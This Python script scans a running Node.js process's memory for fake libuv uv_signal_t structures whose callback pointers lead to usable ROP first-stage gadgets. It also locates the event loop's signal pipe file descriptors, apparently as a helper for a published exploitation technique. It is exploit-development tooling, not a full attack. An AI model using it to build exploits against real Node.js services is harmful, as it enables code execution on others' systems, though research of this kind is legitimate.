#!/usr/bin/env python3
import argparse
import json
import os
import re
import struct
import subprocess
from dataclasses import dataclass

from capstone import Cs, CS_ARCH_X86, CS_MODE_64

DEFAULT_SIGNAL_CB_OFFSET = 0x60
DEFAULT_SIGNUM_OFFSET = 0x68
DEFAULT_FLAGS_OFFSET = 0x58
DEFAULT_LOOP_SIGNAL_PIPEFD_OFFSET = 0x228


@dataclass
class Mapping:
    start: int
    end: int
    perms: str
    offset: int
    path: str

    @property
    def size(self):
        return self.end - self.start

    def contains(self, address):
        return self.start <= address < self.end

    def label(self):
        suffix = f" {self.path}" if self.path else ""
        return f"{self.start:016x}-{self.end:016x} {self.perms} off={self.offset:x}{suffix}"


def parse_maps(pid):
    maps = []
    with open(f"/proc/{pid}/maps", "r", encoding="utf-8") as fp:
        for line in fp:
            match = re.match(
                r"^([0-9a-f]+)-([0-9a-f]+)\s+(\S+)\s+([0-9a-f]+)\s+\S+\s+\S+\s*(.*)$",
                line.strip(),
            )
            if not match:
                continue
            start, end, perms, offset, path = match.groups()
            maps.append(Mapping(
                start=int(start, 16),
                end=int(end, 16),
                perms=perms,
                offset=int(offset, 16),
                path=path,
            ))
    return maps


def mapping_for(maps, address):
    for mapping in maps:
        if mapping.contains(address):
            return mapping
    return None


def read_mem(mem_fd, address, size):
    return os.pread(mem_fd, size, address)


def read_u32(mem_fd, address):
    return struct.unpack("<I", read_mem(mem_fd, address, 4))[0]


def read_i32(mem_fd, address):
    return struct.unpack("<i", read_mem(mem_fd, address, 4))[0]


def read_i32_pair(mem_fd, address):
    return struct.unpack("<ii", read_mem(mem_fd, address, 8))


def get_exe(pid):
    return os.path.realpath(f"/proc/{pid}/exe")


def get_symbol(exe, name):
    try:
        output = subprocess.check_output(["nm", "-n", exe], text=True, stderr=subprocess.DEVNULL)
    except Exception:
        return None

    for line in output.splitlines():
        parts = line.split()
        if len(parts) >= 3 and parts[-1] == name:
            return int(parts[0], 16)
    return None


def disassemble_gadget(mem_fd, address, max_bytes=24):
    try:
        code = read_mem(mem_fd, address, max_bytes)
    except OSError:
        return None

    md = Cs(CS_ARCH_X86, CS_MODE_64)
    instructions = []
    for insn in md.disasm(code, address):
        instructions.append({
            "address": insn.address,
            "mnemonic": insn.mnemonic,
            "op_str": insn.op_str,
            "text": f"{insn.mnemonic} {insn.op_str}".strip(),
        })
        if insn.mnemonic in ("ret", "jmp", "call", "syscall", "int"):
            break
        if len(instructions) >= 8:
            break

    return instructions or None


def classify_first_stage(instructions):
    if not instructions:
        return {"kind": "unknown", "useful": False}

    pop_count = 0
    pop_registers = []
    for insn in instructions:
        if insn["mnemonic"] == "pop":
            pop_registers.append(insn["op_str"])
            pop_count += 1
            continue
        if insn["mnemonic"] == "ret":
            has_pop_rsp = "rsp" in pop_registers
            return {
                "kind": "pop-ret",
                "useful": pop_count >= 3 and not has_pop_rsp,
                "popCount": pop_count,
                "popRegisters": pop_registers,
                "hasPopRsp": has_pop_rsp,
                "controlledRetOffset": 8 * (pop_count - 1),
            }
        break

    first = instructions[0]
    if first["mnemonic"] == "add" and first["op_str"].startswith("rsp, "):
        try:
            imm = int(first["op_str"].split(", ", 1)[1], 0)
        except ValueError:
            imm = None
        if imm is not None and len(instructions) > 1 and instructions[1]["mnemonic"] == "ret":
            return {
                "kind": "add-rsp-ret",
                "useful": imm >= 0x18,
                "addRsp": imm,
                "controlledRetOffset": imm - 8,
            }

    if first["mnemonic"] == "leave" and len(instructions) > 1 and instructions[1]["mnemonic"] == "ret":
        return {"kind": "leave-ret", "useful": False}

    return {"kind": "other", "useful": False}


def quick_classify_first_stage_bytes(code):
    index = 0
    pop_count = 0
    pop_registers = []
    regs = ["rax", "rcx", "rdx", "rbx", "rsp", "rbp", "rsi", "rdi"]
    ext_regs = ["r8", "r9", "r10", "r11", "r12", "r13", "r14", "r15"]

    while index < len(code):
        byte = code[index]
        if 0x58 <= byte <= 0x5f:
            pop_registers.append(regs[byte - 0x58])
            pop_count += 1
            index += 1
            continue
        if byte == 0x41 and index + 1 < len(code) and 0x58 <= code[index + 1] <= 0x5f:
            pop_registers.append(ext_regs[code[index + 1] - 0x58])
            pop_count += 1
            index += 2
            continue
        break

    if index < len(code) and code[index] == 0xc3:
        has_pop_rsp = "rsp" in pop_registers
        return {
            "kind": "pop-ret",
            "useful": pop_count >= 3 and not has_pop_rsp,
            "popCount": pop_count,
            "popRegisters": pop_registers,
            "hasPopRsp": has_pop_rsp,
            "controlledRetOffset": 8 * (pop_count - 1),
        }

    if len(code) >= 5 and code[0:3] == b"\x48\x83\xc4" and code[4] == 0xc3:
        imm = code[3]
        return {
            "kind": "add-rsp-ret",
            "useful": imm >= 0x18,
            "addRsp": imm,
            "controlledRetOffset": imm - 8,
        }

    if len(code) >= 8 and code[0:3] == b"\x48\x81\xc4" and code[7] == 0xc3:
        imm = struct.unpack_from("<I", code, 3)[0]
        return {
            "kind": "add-rsp-ret",
            "useful": imm >= 0x18,
            "addRsp": imm,
            "controlledRetOffset": imm - 8,
        }

    return {"kind": "other", "useful": False}


def valid_utf8_qword(value):
    try:
        struct.pack("<Q", value).decode("utf-8")
        return True
    except UnicodeDecodeError:
        return False


def valid_utf8_message(handle, signum):
    try:
        struct.pack("<QiI", handle, signum, 0).decode("utf-8")
        return True
    except UnicodeDecodeError:
        return False


def scan_candidates(pid, args):
    exe = get_exe(pid)
    maps = parse_maps(pid)
    node_maps = [
        mapping for mapping in maps
        if "r" in mapping.perms and os.path.realpath(mapping.path) == exe
    ]
    executable_maps = [mapping for mapping in maps if "x" in mapping.perms]

    if args.max_mapping_size:
        node_maps = [mapping for mapping in node_maps if mapping.size <= args.max_mapping_size]

    candidates = []
    mem_fd = os.open(f"/proc/{pid}/mem", os.O_RDONLY)
    try:
        for mapping in node_maps:
            try:
                data = read_mem(mem_fd, mapping.start, mapping.size)
            except OSError:
                continue

            for offset in range(0, len(data) - 8, args.stride):
                callback = struct.unpack_from("<Q", data, offset)[0]
                callback_map = mapping_for(executable_maps, callback)
                if callback_map is None:
                    continue

                handle = mapping.start + offset - args.signal_cb_offset
                handle_map = mapping_for(node_maps, handle)
                if handle_map is None:
                    continue

                if args.require_utf8_pointer and not valid_utf8_qword(handle):
                    continue

                try:
                    signum = read_i32(mem_fd, handle + args.signum_offset)
                    flags = read_u32(mem_fd, handle + args.flags_offset)
                except OSError:
                    continue

                if args.require_utf8_message and not valid_utf8_message(handle, signum):
                    continue

                if args.skip_closing and flags & 1:
                    continue

                if args.signum_min is not None and signum < args.signum_min:
                    continue
                if args.signum_max is not None and signum > args.signum_max:
                    continue

                if args.only_useful:
                    try:
                        quick = quick_classify_first_stage_bytes(
                            read_mem(mem_fd, callback, args.gadget_bytes)
                        )
                    except OSError:
                        continue
                    if not quick.get("useful"):
                        continue

                instructions = disassemble_gadget(mem_fd, callback, args.gadget_bytes)
                classification = classify_first_stage(instructions)
                if args.only_useful and not classification.get("useful"):
                    continue

                candidates.append({
                    "handle": handle,
                    "signalCbField": mapping.start + offset,
                    "signalCb": callback,
                    "signum": signum,
                    "flags": flags,
                    "gadget": [insn["text"] for insn in instructions or []],
                    "classification": classification,
                    "handleMap": handle_map.label(),
                    "callbackMap": callback_map.label(),
                })

                if len(candidates) >= args.limit:
                    return exe, maps, candidates
    finally:
        os.close(mem_fd)

    return exe, maps, candidates


def detect_signal_pipe(pid, exe, maps, offset):
    symbol = get_symbol(exe, "default_loop_struct")
    if symbol is None:
        return None

    mem_fd = os.open(f"/proc/{pid}/mem", os.O_RDONLY)
    try:
        read_fd, write_fd = read_i32_pair(mem_fd, symbol + offset)
    except OSError:
        return None
    finally:
        os.close(mem_fd)

    fds = {}
    for fd in os.listdir(f"/proc/{pid}/fd"):
        try:
            fds[int(fd)] = os.readlink(f"/proc/{pid}/fd/{fd}")
        except OSError:
            pass

    return {
        "defaultLoopStruct": symbol,
        "signalPipeReadFd": read_fd,
        "signalPipeWriteFd": write_fd,
        "readFdTarget": fds.get(read_fd),
        "writeFdTarget": fds.get(write_fd),
    }


def format_candidate(candidate):
    classification = candidate["classification"]
    lines = [
        f"handle=0x{candidate['handle']:x} signum={candidate['signum']} flags=0x{candidate['flags']:x}",
        f"  signal_cb field=0x{candidate['signalCbField']:x} -> 0x{candidate['signalCb']:x}",
        f"  class={classification.get('kind')} useful={classification.get('useful')}"
    ]
    if "popCount" in classification:
        lines[-1] += (
            f" pops={classification['popCount']}"
            f" controlled_ret_offset=0x{classification['controlledRetOffset']:x}"
        )
    if "addRsp" in classification:
        lines[-1] += (
            f" add_rsp=0x{classification['addRsp']:x}"
            f" controlled_ret_offset=0x{classification['controlledRetOffset']:x}"
        )
    if candidate["gadget"]:
        lines.append("  gadget: " + " ; ".join(candidate["gadget"]))
    lines.append(f"  handle_map: {candidate['handleMap']}")
    lines.append(f"  callback_map: {candidate['callbackMap']}")
    return "\n".join(lines)


def main():
    parser = argparse.ArgumentParser(
        description="Scan a running Node.js process for SonarSource-style fake uv_signal_t data-structure gadgets."
    )
    parser.add_argument("pid", type=int, help="PID of a running Node.js process")
    parser.add_argument("--json", action="store_true", help="emit JSON")
    parser.add_argument("--limit", type=int, default=50, help="maximum candidates to print")
    parser.add_argument("--stride", type=int, default=8, help="scan stride inside Node readable mappings; use 1 for exhaustive byte-by-byte search")
    parser.add_argument("--only-useful", action="store_true", help="only show first-stage gadgets that naturally ret into pipe data")
    parser.add_argument("--require-utf8-pointer", action="store_true", help="require little-endian handle pointer bytes to be valid UTF-8")
    parser.add_argument("--require-utf8-message", action="store_true", help="require handle+signum+zero-padding message bytes to be valid UTF-8")
    parser.add_argument("--skip-closing", action="store_true", default=True, help="skip handles whose flags have UV_HANDLE_CLOSING set")
    parser.add_argument("--include-closing", dest="skip_closing", action="store_false", help="do not filter UV_HANDLE_CLOSING-looking candidates")
    parser.add_argument("--signum-min", type=int)
    parser.add_argument("--signum-max", type=int)
    parser.add_argument("--signal-cb-offset", type=lambda v: int(v, 0), default=DEFAULT_SIGNAL_CB_OFFSET)
    parser.add_argument("--signum-offset", type=lambda v: int(v, 0), default=DEFAULT_SIGNUM_OFFSET)
    parser.add_argument("--flags-offset", type=lambda v: int(v, 0), default=DEFAULT_FLAGS_OFFSET)
    parser.add_argument("--loop-signal-pipefd-offset", type=lambda v: int(v, 0), default=DEFAULT_LOOP_SIGNAL_PIPEFD_OFFSET)
    parser.add_argument("--gadget-bytes", type=int, default=24)
    parser.add_argument("--max-mapping-size", type=lambda v: int(v, 0), default=0)
    parser.add_argument("--no-signal-pipe", action="store_true", help="do not try to read default_loop_struct.signal_pipefd")
    args = parser.parse_args()

    exe, maps, candidates = scan_candidates(args.pid, args)
    signal_pipe = None if args.no_signal_pipe else detect_signal_pipe(
        args.pid, exe, maps, args.loop_signal_pipefd_offset
    )

    if args.json:
        print(json.dumps({
            "pid": args.pid,
            "exe": exe,
            "signalPipe": signal_pipe,
            "offsets": {
                "signalCb": args.signal_cb_offset,
                "signum": args.signum_offset,
                "flags": args.flags_offset,
                "loopSignalPipefd": args.loop_signal_pipefd_offset,
            },
            "candidates": candidates,
        }, indent=2))
        return

    print(f"pid={args.pid}")
    print(f"exe={exe}")
    if signal_pipe:
        print(
            "signal_pipe="
            f"default_loop_struct=0x{signal_pipe['defaultLoopStruct']:x} "
            f"read_fd={signal_pipe['signalPipeReadFd']}({signal_pipe['readFdTarget']}) "
            f"write_fd={signal_pipe['signalPipeWriteFd']}({signal_pipe['writeFdTarget']})"
        )
    print(f"candidates={len(candidates)}")
    for candidate in candidates:
        print()
        print(format_candidate(candidate))


if __name__ == "__main__":
    main()
